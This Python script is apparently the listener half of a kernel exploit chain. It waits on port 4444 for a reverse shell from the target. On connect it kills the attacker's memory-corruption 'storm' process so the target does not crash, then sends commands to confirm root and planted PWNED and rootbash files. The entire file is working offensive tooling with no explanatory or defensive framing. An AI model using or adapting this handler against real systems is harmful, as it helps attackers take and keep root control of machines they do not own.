#!/usr/bin/env python3
"""shell_handler.py - reverse-shell listener that stops the storm on connect.

The payload's fake-skb release / later bad-neighbour over-reads can panic the
target *after* root is obtained.  To minimise that, this handler kills the
attacker-side storm immediately on the reverse-shell connection, then probes
the shell for proof.
"""
import os
import select
import socket
import sys
import time

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
print("listening", flush=True)
c, a = s.accept()
print("CONNECTED %s" % (a,), flush=True)
os.system("pkill -f mpstorm3_mix4 >/dev/null 2>&1")
time.sleep(0.2)
c.sendall(b"id; echo SHELL_OK; ls -l /home/ubuntu/PWNED /tmp/PWNED /tmp/rootbash 2>/dev/null\n")
time.sleep(1.0)
c.setblocking(False)
while True:
    r, _, _ = select.select([c], [], [], 5.0)
    if not r:
        break
    try:
        d = c.recv(65536)
    except Exception:
        break
    if not d:
        break
    sys.stdout.write(d.decode(errors="replace"))
    sys.stdout.flush()
print("handler_done", flush=True)
